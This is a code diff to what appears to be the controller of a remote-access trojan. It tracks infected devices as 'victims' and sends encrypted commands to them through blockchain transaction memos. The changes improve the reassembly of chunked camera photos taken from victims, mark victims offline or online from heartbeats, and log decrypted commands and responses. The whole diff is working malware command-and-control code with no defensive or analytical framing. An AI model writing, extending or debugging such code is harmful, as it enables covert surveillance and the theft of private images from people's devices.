@@ -971,6 +971,7 @@ function extractMemosFromTxMain(tx) {
 
 // Chunk buffers for assembling multi-part responses
 const blockchainChunkBuffers = new Map();
+const completedChunkTransfers = new Set(); // Track completed chunk transfers to prevent reprocessing
 
 // Track RPC rate limits and rotation
 let rpcRateLimitMap = new Map(); // rpc -> { last429: timestamp, consecutive429s: count }
@@ -982,7 +983,13 @@ let pollCycleCount = 0;
 
 // Helper function to check and complete any pending chunk assemblies
 function checkPendingChunkAssemblies(config, sendBlockchainLog) {
+  // Clean up old completed transfers (older than 1 hour) to prevent memory leaks
+  // Note: We keep them for a while in case of duplicate chunks arriving late
+  // This is just a safety measure - the main protection is checking before processing
+  
   if (blockchainChunkBuffers.size === 0) {
+    // If no pending transfers, we can optionally clean up old completed ones
+    // But keep them for at least 5 minutes in case of late-arriving duplicates
     return; // No pending transfers
   }
   
@@ -1095,7 +1102,12 @@ function checkPendingChunkAssemblies(config, sendBlockchainLog) {
       }
       
       const assembled = entry.parts.join('');
+      
+      // CRITICAL: Mark as completed IMMEDIATELY before deleting and processing
+      // This prevents late-arriving chunks from creating a new transfer
+      completedChunkTransfers.add(chunkId);
       blockchainChunkBuffers.delete(chunkId);
+      
       const finalElapsed = ((Date.now() - entry.startTime) / 1000).toFixed(1);
       log.success(`[Blockchain] ✓ All ${entry.total} chunks assembled for ${chunkId} (${finalElapsed}s)`);
       sendBlockchainLog(`[✓] All ${entry.total} chunks assembled for ${chunkId} (${finalElapsed}s)`);
@@ -1120,6 +1132,15 @@ function checkPendingChunkAssemblies(config, sendBlockchainLog) {
         if (isPhoto) {
           log.info(`[Blockchain] Photo will be saved automatically when processed by camera handler`);
           console.log(`[Blockchain] Photo will be saved to Downloads folder when camera handler processes it`);
+          
+          // Notify GUI that image was received
+          if (win && win.webContents) {
+            win.webContents.send('Blockchain:ImageReceived', {
+              chunkId: chunkId,
+              chunks: entry.total,
+              elapsed: finalElapsed
+            });
+          }
         }
       } else {
         log.error(`[Blockchain] Failed to decrypt assembled chunks for ${chunkId}`);
@@ -1142,8 +1163,26 @@ async function pollBlockchainForClients(config) {
     }
   };
   
-  // Add delay to prevent rate limiting
+  // Check for offline blockchain clients (no heartbeat for 2 minutes)
+  const HEARTBEAT_TIMEOUT = 2 * 60 * 1000; // 2 minutes
   const now = Date.now();
+  const allVictims = victimsList.getAllVictims();
+  for (const [id, victim] of Object.entries(allVictims)) {
+    if (victim && (victim.isBlockchain || victim.connectionType === 'blockchain' || victim.country === 'BC' || victim.ip === 'Blockchain')) {
+      if (victim.isOnline && victim.lastSeen) {
+        const timeSinceLastSeen = now - victim.lastSeen;
+        if (timeSinceLastSeen > HEARTBEAT_TIMEOUT) {
+          log.info(`[Blockchain] Client ${id.substring(0, 8)}... marked offline (no heartbeat for ${Math.floor(timeSinceLastSeen / 1000)}s)`);
+          victimsList.setOffline(id);
+          if (win && win.webContents) {
+            win.webContents.send('SocketIO:VictimOffline', id);
+          }
+        }
+      }
+    }
+  }
+  
+  // Add delay to prevent rate limiting
   const timeSinceLastPoll = now - lastPollTime;
   if (timeSinceLastPoll < MIN_POLL_INTERVAL) {
     await new Promise(resolve => setTimeout(resolve, MIN_POLL_INTERVAL - timeSinceLastPoll));
@@ -1386,6 +1425,28 @@ async function pollBlockchainForClients(config) {
           // Log all memos for debugging
           if (memo.startsWith('CMD:')) {
             sendBlockchainLog(`[→] Outgoing command: ${memo.substring(0, 50)}...`);
+            // Send to logs panel
+            if (win && win.webContents) {
+              try {
+                const cmdData = memo.substring(4); // Remove 'CMD:' prefix
+                const decrypted = decryptMemoPayloadMain(cmdData, config.aesKey);
+                if (decrypted) {
+                  const parsed = JSON.parse(decrypted);
+                  win.webContents.send('log:request', {
+                    deviceId: 'blockchain',
+                    command: parsed.event || 'command',
+                    data: JSON.stringify(parsed.data || parsed, null, 2)
+                  });
+                }
+              } catch (e) {
+                // If decryption fails, just log the raw command
+                win.webContents.send('log:request', {
+                  deviceId: 'blockchain',
+                  command: 'CMD',
+                  data: memo.substring(0, 200)
+                });
+              }
+            }
             continue;
           }
           
@@ -1398,12 +1459,27 @@ async function pollBlockchainForClients(config) {
               const total = parseInt(match[3], 10);
               const chunkHex = match[4];
               
+              // CRITICAL: Ignore chunks for already-completed transfers - check FIRST before any processing
+              if (completedChunkTransfers.has(chunkId)) {
+                log.info(`[Blockchain] Ignoring chunk ${part}/${total} for already-completed transfer ${chunkId} (transfer was already assembled and processed)`);
+                sendBlockchainLog(`[ℹ] Ignoring late chunk ${part}/${total} for completed transfer ${chunkId}`);
+                continue; // Skip this chunk entirely - don't process it
+              }
+              
               // Log chunk reception with order info
               log.info(`[Blockchain] Chunk ${part}/${total} received (id: ${chunkId}, order: ${part})`);
               sendBlockchainLog(`[⬇] Chunk ${part}/${total} received (id: ${chunkId})`);
               
               let entry = blockchainChunkBuffers.get(chunkId);
               const isFirstChunk = !entry;
+              
+              // Double-check completedChunkTransfers before creating new entry (defense in depth)
+              if (!entry && completedChunkTransfers.has(chunkId)) {
+                log.warn(`[Blockchain] Attempted to create new entry for completed transfer ${chunkId} - ignoring chunk ${part}/${total}`);
+                sendBlockchainLog(`[⚠] Ignoring chunk ${part}/${total} - transfer ${chunkId} already completed`);
+                continue;
+              }
+              
               if (!entry) {
                 entry = { 
                   total, 
@@ -1552,7 +1628,12 @@ async function pollBlockchainForClients(config) {
                 console.log(`[Blockchain] ✓ All ${entry.total} parts verified - assembling...`);
                 
                 const assembled = entry.parts.join('');
+                
+                // CRITICAL: Mark as completed IMMEDIATELY before deleting and processing
+                // This prevents late-arriving chunks from creating a new transfer
+                completedChunkTransfers.add(chunkId);
                 blockchainChunkBuffers.delete(chunkId);
+                
                 const elapsed = ((Date.now() - entry.startTime) / 1000).toFixed(1);
                 log.success(`[Blockchain] ✓ All ${total} chunks assembled for ${chunkId} (${elapsed}s)`);
                 sendBlockchainLog(`[✓] All ${total} chunks assembled for ${chunkId} (${elapsed}s)`);
@@ -1573,18 +1654,33 @@ async function pollBlockchainForClients(config) {
                   } catch (e) {
                     // Not JSON, continue
                   }
+                  
+                  // Process the response - this will dispatch to socket listeners and display the image
                   processBlockchainResponse(decrypted, info.signature, sendBlockchainLog);
                   
                   // Log photo info for debugging
                   if (isPhoto) {
                     log.info(`[Blockchain] Photo will be saved automatically when processed by camera handler`);
                     console.log(`[Blockchain] Photo will be saved to Downloads folder when camera handler processes it`);
+                    
+                    // Notify GUI that image was received
+                    if (win && win.webContents) {
+                      win.webContents.send('Blockchain:ImageReceived', {
+                        chunkId: chunkId,
+                        chunks: total,
+                        elapsed: elapsed
+                      });
+                    }
                   }
                 } else {
                   log.error(`[Blockchain] Failed to decrypt assembled chunks for ${chunkId}`);
                   sendBlockchainLog(`[✗] Failed to decrypt assembled chunks`);
                   console.error(`[Blockchain] ✗ Failed to decrypt assembled chunks for ${chunkId}`);
                 }
+                
+                // Stop processing more chunks for this transfer - return early to prevent reprocessing
+                // Any late-arriving chunks will be ignored due to completedChunkTransfers check
+                continue;
               } else {
                 // Debug: Log when we're close but not complete
                 if (actualReceived >= entry.total - 3) {
@@ -1678,6 +1774,15 @@ function processBlockchainResponse(decrypted, signature, sendLog) {
     const eventName = parsed.event || 'unknown';
     // Data can be nested in parsed.data OR directly in parsed (for init/heartbeat)
     const data = parsed.data || parsed;
+    
+    // Send to logs panel
+    if (win && win.webContents) {
+      win.webContents.send('log:response', {
+        deviceId: data.clientId || data.id || 'blockchain',
+        command: eventName,
+        data: JSON.stringify(data, null, 2)
+      });
+    }
     
     // Log camera/image responses for debugging
     if (eventName === 'x0000ca' && data && data.image) {
@@ -1903,9 +2008,28 @@ function processBlockchainResponse(decrypted, signature, sendLog) {
           victim.conn = 'blockchain';
         }
         
+        // Ensure victim is marked as online
+        if (!victim.isOnline) {
+          victim.isOnline = true;
+          // If it was in offlineList, move it back to victimList
+          if (victimsList.offlineList && victimsList.offlineList[clientId]) {
+            delete victimsList.offlineList[clientId];
+            victimsList.victimList[clientId] = victim;
+          }
+        }
+        
         // Notify renderer of update so UI refreshes - use clientId
         if (win && win.webContents) {
           win.webContents.send('SocketIO:VictimUpdate', clientId);
+          // Also send online status update
+          win.webContents.send('SocketIO:VictimOnline', clientId);
+        }
+        
+        // Send heartbeat to logs panel
+        if (win && win.webContents && eventName === `heartbeat`) {
+          win.webContents.send('log:info', {
+            message: `Heartbeat from ${clientId.substring(0, 8)}... (battery: ${data.battery || "?"}%)`
+          });
         }
         
         if (eventName === `heartbeat`) {
